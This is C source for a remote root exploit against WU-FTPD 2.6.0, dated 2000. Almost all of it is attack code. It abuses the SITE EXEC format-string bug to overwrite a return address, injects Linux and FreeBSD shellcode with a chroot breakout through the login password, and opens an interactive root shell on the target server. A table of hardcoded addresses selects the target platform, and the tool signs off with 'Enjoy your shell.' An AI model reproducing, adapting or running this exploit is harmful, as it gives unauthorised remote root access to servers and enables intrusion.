/*
 * (c) 2000 venglin / b0f
 * http://b0f.freebsd.lublin.pl
 *
 * WUFTPD 2.6.0 REMOTE ROOT EXPLOIT (22/06/2000, updated: 05/08/2000)
 *
 * Idea and preliminary version of exploit by tf8
 *
 * Greetz: Lam3rZ, TESO, ADM, lcamtuf, karpio.
 * Dedicated to ksm.
 *
 * **PRIVATE**DO*NOT*DISTRIBUTE**
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <unistd.h>
#include <arpa/inet.h>


#define repln   if (getreply(0) < 0) return -1
#define replv   if (getreply(1) < 0) return -1

#ifdef DEBUG
#define repl replv
#else
#define repl repln
#endif

char usage[] = "usage: bobek [-l login] [-o port] [-f retofs] [-s retlocofs]\n\
t<-t type> <hostname>";
char recvbuf[BUFSIZ], sendbuf[BUFSIZ];
FILE *cin, *cout;

char linuxcode[]= /* Lam3rZ chroot() code */
        "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0\x31\xdb"
        "\x43\x89\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b\x5e\x31\xc0\x31"
        "\xc9\x8d\x5e\x01\x88\x46\x04\x66\xb9\xff\x01\xb0\x27\xcd"
        "\x80\x31\xc0\x8d\x5e\x01\xb0\x3d\xcd\x80\x31\xc0\x31\xdb"
        "\x8d\x5e\x08\x89\x43\x02\x31\xc9\xfe\xc9\x31\xc0\x8d\x5e"
        "\x08\xb0\x0c\xcd\x80\xfe\xc9\x75\xf3\x31\xc0\x88\x46\x09"
        "\x8d\x5e\x08\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30\xfe\xc8\x88"
        "\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\x89"
        "\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0\x31"
        "\xdb\xb0\x01\xcd\x80\xe8\x90\xff\xff\xff\x30\x62\x69\x6e"
        "\x30\x73\x68\x31\x2e\x2e\x31\x31\x76\x65\x6e\x67\x6c\x69"
        "\x6e\x40\x6b\x6f\x63\x68\x61\x6d\x2e\x6b\x61\x73\x69\x65"
        "\x2e\x63\x6f\x6d";

char bsdcode[] = /* Lam3rZ chroot() code rewritten for FreeBSD by venglin */
        "\x31\xc0\x50\x50\x50\xb0\x7e\xcd\x80\x31\xdb\x31\xc0\x43"
        "\x43\x53\x4b\x53\x53\xb0\x5a\xcd\x80\xeb\x77\x5e\x31\xc0"
        "\x8d\x5e\x01\x88\x46\x04\x66\x68\xff\x01\x53\x53\xb0\x88"
        "\xcd\x80\x31\xc0\x8d\x5e\x01\x53\x53\xb0\x3d\xcd\x80\x31"
        "\xc0\x31\xdb\x8d\x5e\x08\x89\x43\x02\x31\xc9\xfe\xc9\x31"
        "\xc0\x8d\x5e\x08\x53\x53\xb0\x0c\xcd\x80\xfe\xc9\x75\xf1"
        "\x31\xc0\x88\x46\x09\x8d\x5e\x08\x53\x53\xb0\x3d\xcd\x80"
        "\xfe\x0e\xb0\x30\xfe\xc8\x88\x46\x04\x31\xc0\x88\x46\x07"
        "\x89\x76\x08\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"
        "\x52\x51\x53\x53\xb0\x3b\xcd\x80\x31\xc0\x31\xdb\x53\x53"
        "\xb0\x01\xcd\x80\xe8\x84\xff\xff\xff\x30\x62\x69\x6e\x30"
        "\x73\x68\x31\x2e\x2e\x31\x31\x76\x65\x6e\x67\x6c\x69\x6e"
        "\x40\x6b\x6f\x63\x68\x61\x6d\x2e\x6b\x61\x73\x69\x65\x2e"
        "\x63\x6f\x6d";

struct platforms
{
        char *os;
        char *version;
        char *code;
        int align;
        int eipoff;
        long ret;
        long retloc;
        int sleep;
};

struct platforms targ[] =
{
        { "FreeBSD 3.4-STABLE", "2.6.0-ports", bsdcode, 2, 1024, 0x80b1f10, 0xb
fbfcc04, 0 },
        { "FreeBSD 5.0-CURRENT", "2.6.0-ports", bsdcode, 2, 1024, 0x80b1510, 0x
bfbfec0c, 0 },
        { "FreeBSD 3.4-STABLE", "2.6.0-packages", bsdcode, 2, 1024, 0x80b1510, 
0xbfbfe798, 0 },
        { "FreeBSD 3.4-STABLE", "2.6.0-venglin", bsdcode, 2, 1024, 0x807078c, 0
xbfbfcc04, 0 },
        { "RedHat Linux 6.2", "2.6.0-RPM", linuxcode, 2, 1024, 0x80759e0, 0xbff
fcf74, 0 },
        { "RedHat Linux 6.2", "2.6.0-RPM", linuxcode, 2, 1024, 0x80759e0, 0xbff
fd074, 0 },
        { "RedHat Linux 6.2", "2.6.0-RPM", linuxcode, 2, 1024, 0x80759e0, 0xbff
fcf84, 0 },
        { "RedHat Linux 6.2", "2.6.0-RPM", linuxcode, 2, 1024, 0x80759e0, 0xbff
fd04c, 0 },
        { "RedHat Linux 6.2-SMP", "2.6.0-RPM", linuxcode, 2, 1024, 0x80759e0, 0
xbfffd0e4, 0 },
        { NULL, NULL, NULL, 0, 0, 0, 0 }
};

long getip(name)
char *name;
{
        struct hostent *hp;
        long ip;
        extern int h_errno;

        if ((ip = inet_addr(name)) < 0)
        {
                if (!(hp = gethostbyname(name)))
                {
                        fprintf(stderr, "gethostbyname(): %s\n",
                                strerror(h_errno));
                        exit(1);
                }
                memcpy(&ip, (hp->h_addr), 4);
        }

        return ip;
}

int connecttoftp(host, port)
char *host;
int port;
{
        int sockfd;
        struct sockaddr_in cli;

        bzero(&cli, sizeof(cli));
        cli.sin_family = AF_INET;
        cli.sin_addr.s_addr=getip(host);
        cli.sin_port = htons(port);

        if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
        {
                perror("socket");
                return -1;
        }

        if(connect(sockfd, (struct sockaddr *)&cli, sizeof(cli)) < 0) 
        {
                perror("connect");
                close(sockfd);
                return -1;
        }

        cin = fdopen(sockfd, "r");
        cout = fdopen(sockfd, "w");

        if (!cin || !cout)
        {
                close(sockfd);
                return -1;
        }

        return sockfd;
}

int command(const char *fmt, ...)
{
        char buf1[BUFSIZ], buf2[BUFSIZ*2], *p, *q;

        va_list args;

        if (!cout)
                return -1;

        bzero(buf1, BUFSIZ);
        bzero(buf2, BUFSIZ*2);

        va_start(args, fmt);
        vsnprintf(buf1, BUFSIZ, fmt, args);
        va_end(args);

        for (p=buf1,q=buf2;*p;p++,q++)
        {
                if (*p == '\xff')
                {
                        *q++ = '\xff';
                        *q = '\xff';
                }
                else
                        *q = *p;
        }

        fprintf(cout, "%s", buf2);

#ifdef DEBUG
        fprintf(stderr, "--> ");
        fprintf(stderr, "%s", buf2);
        fputc('\n', stderr);
#endif

        fputs("\r\n", cout);
        (void)fflush(cout);
        return 0;
}

int getreply(v)
int v;
{
        if (!(fgets(recvbuf, BUFSIZ, cin)))
                return -1;

        if (v)
                fprintf(stderr, "<-- %s", recvbuf);

        return 0;
}

int logintoftp(login, passwd)
char *login, *passwd;
{
        do
                repl;
        while (strncmp(recvbuf, "220 ", 4));

        if ((command("USER %s", login)) < 0)
                return -1;

        repl;

        if (strncmp(recvbuf, "331", 3))
        {
                puts(recvbuf);
                return -1;
        }

        if ((command("PASS %s", passwd) < 0))
                return -1;

        do
                repl;
        while (strncmp(recvbuf, "230 ", 4));

        return 0;
}

int checkvuln(void)
{
        command("SITE EXEC %%p");
        repl;

        if(strncmp(recvbuf, "200-", 4))
                return -1;

        if(strncmp(recvbuf+4, "0x", 2))
                return -1;

        repl;

        return 0;
}

int findeip(eipoff, align)
int eipoff, align;
{
        int i, j, off;
        char *p1;
        char eip1[10], eip2[10];

        for (i=eipoff;;i+=8)
        {
                fprintf(stderr, "at offset %d\n", i);
                strcpy(sendbuf, "SITE EXEC ");
 
                for (j=0;j<align;j++) strcat(sendbuf, "a");
                strcat(sendbuf, "abcd");

                for (j=0;j<eipoff/8;j++) strcat(sendbuf, "%%.f");
                for (j=0;j<(i-eipoff)/8;j++) strcat(sendbuf, "%%d%%d");
                strcat(sendbuf, "|%%.8x|%%.8x");

                if (command(sendbuf) < 0)
                        return -1;

                repl;

                if (!(p1 = strchr(recvbuf, '|')))
                        return -1;

                strncpy(eip1, p1+1, 8);
                strncpy(eip2, p1+10, 8);

                eip1[8] = eip2[8] = '\0';

                if (!(strcmp(eip1, "64636261")))
                {
                        off = i;
                        break;
                }

                if (!(strcmp(eip2, "64636261")))
                {
                        off = i + 4;
                        break;
                }

                repl;
        }

        repl;

        return off;
}

char *putshell(type)
int type;
{
        static char buf[400];
        int noplen;

        char *code = targ[type].code;

        noplen = sizeof(buf) - strlen(code) - 2;

        memset(buf, 0x90, noplen);
        buf[noplen+1] = '\0';
        strcat(buf, code);

        return buf;
}

int overwrite(ptr, off, align, retloc, eipoff)
long ptr, retloc;
int off, align, eipoff;
{
        int i, size = 0;
        char buf[100];

        fprintf(stderr, "RET: %p, RET location: %p,"
                " RET location offset on stack: %d\n",
                (void *)ptr, (void *)retloc, off);

        if (off >= 12)
        {

                strcpy(sendbuf, "SITE EXEC ");

                for (i=0;i<eipoff/8;i++) strcat(sendbuf, "%%.f");
                for (i=0;i<(off-eipoff-8)/8;i++) strcat(sendbuf, "%%d%%d");

                if (((off-eipoff-8) % 8) != 0) strcat(sendbuf, "%%d%%d");

                if (command(sendbuf) < 0)
                        return -1;      

                repl;

                size = strlen(recvbuf+4) - 2;

                repl;
        }

        fprintf(stderr, "Reply size: %d, New RET: %p\n", size,
                (void *)(ptr-size));

        strcpy(sendbuf, "SITE EXEC ");
        for (i=0;i<align;i++) strcat(sendbuf, "a");

        sprintf(buf, "%c%c%c%c", ((int)retloc & 0xff),
                (((int)retloc & 0xff00) >> 8),
                (((int)retloc & 0xff0000) >> 16),
                (((int)retloc & 0xff000000) >> 24));

        strcat(sendbuf, buf);

        for (i=0;i<eipoff/8;i++) strcat(sendbuf, "%%.f");
        for (i=0;i<(off-eipoff-8)/8;i++) strcat(sendbuf, "%%d%%d");

        if (((off-eipoff-8) % 8) != 0) strcat(sendbuf, "%%d%%d");

        strcat(sendbuf, "%%.");
        sprintf(buf, "%d", (int)ptr-size);
        strcat(sendbuf, buf);
        strcat(sendbuf, "d%%n");

        if (command(sendbuf) < 0)
                return -1;

        return 0;
}

int sh(sockfd)
int sockfd;
{
        char buf[BUFSIZ];
        int c;
        fd_set rf, drugi;
        char cmd[] = "uname -a ; pwd ; id\n";
        
        FD_ZERO(&rf);
        FD_SET(0, &rf);
        FD_SET(sockfd, &rf);
        write(sockfd, cmd, strlen(cmd));

        while (1)
        {
                bzero(buf, BUFSIZ);
                memcpy (&drugi, &rf, sizeof(rf));
                select(sockfd+1, &drugi, NULL, NULL, NULL);
                if (FD_ISSET(0, &drugi))
                {
                        c = read(0, buf, BUFSIZ);
                        send(sockfd, buf, c, 0x4);
                }

                if (FD_ISSET(sockfd, &drugi))
                {
                        c = read(sockfd, buf, BUFSIZ);
                        if (c<0) return 0;
                        write(1,buf,c);
                }
        }
}

int main(argc, argv)
int argc;
char **argv;
{
        extern int optind, opterr;
        extern char *optarg;
        int ch, type, port, eipoff, fd, retofs, retlocofs, align, i, retoff;
        long ret, retloc;
        char login[BUFSIZ], password[BUFSIZ];

        opterr = retofs = retlocofs = 0;
        strcpy(login, "ftp");
        type = -1;
        port = 21;

        while ((ch = getopt(argc, argv, "l:f:s:t:o")) != -1)
                switch((char)ch)        
                {
                        case 'l':
                                strcpy(login, optarg);
                                break;

                        case 't':
                                type = atoi(optarg);
                                break;

                        case 'o':
                                port = atoi(optarg);
                                break;

                        case 'f':
                                retofs = atoi(optarg);
                                break;

                        case 's':
                                retlocofs = atoi(optarg);
                                break;

                        case '?':
                        default:
                                puts(usage);
                                exit(0);
                }

        argc -= optind;
        argv += optind;

        fprintf(stderr, "PanBobek v1.1 by venglin@freebsd.lublin.pl\n\n");

        if (type < 0)
        {
                fprintf(stderr, "Please select platform:\n");
                for (i=0;targ[i].os;i++)
                {
                        fprintf(stderr, "\t-t %d : %s %s (%p / %p)\n", i,
                                targ[i].os, targ[i].version,
                                (void *)targ[i].ret,
                                (void *)targ[i].retloc);
                }
                exit(0);
        }

        fprintf(stderr, "Selected platform: %s with WUFTPD %s\n\n",
                targ[type].os, targ[type].version);

        eipoff = targ[type].eipoff;
        align = targ[type].align;
        ret = targ[type].ret;
        retloc = targ[type].retloc;
        retloc += retlocofs;
        ret += retofs;

        if (argc != 1)
        {
                puts(usage);
                exit(0);
        }

        strcpy(password, putshell(type));

        if ((fd = connecttoftp(*argv, port)) < 0)
        {    
                (void)fprintf(stderr, "Connection to %s failed.\n", *argv);
                exit(1);
        }

        (void)fprintf(stderr, "Connected to %s. Trying to log in.\n", *argv);

        if (logintoftp(login, password) < 0)
        {
                (void)fprintf(stderr, "Logging in to %s (%s) failed.\n",
                        *argv, login);
                exit(1);
        }

        (void)fprintf(stderr, "Logged in as %s. Checking vulnerability.\n",
                login);

        sleep(targ[type].sleep);

        if (checkvuln() < 0)
        {
                (void)fprintf(stderr, "Sorry, this version isn't"
                        " vulnerable or uses internal vsnprintf().\n");
                exit(1);
        }

        (void)fprintf(stderr, "Ok, trying to find offset (initial: %d)\n",
                eipoff);

        if ((retoff = findeip(eipoff, align)) < 0)
        {
                (void)fprintf(stderr, "\nError finding offset. Adjust"
                        " align.\n");
                exit(1);
        }

        if (overwrite(ret, retoff, align, retloc, eipoff) < 0)
        {
                (void)fprintf(stderr, "Error overwriting RET addr.\n");
                exit(1);
        }

        fprintf(stderr, "Wait up to few minutes for reply. It depends on "
                        "victim's CPU speed.\nEnjoy your shell.\n");

        sh(fd);

        exit(0);
}
/*                    www.hack.co.za   [21 November 2000]*/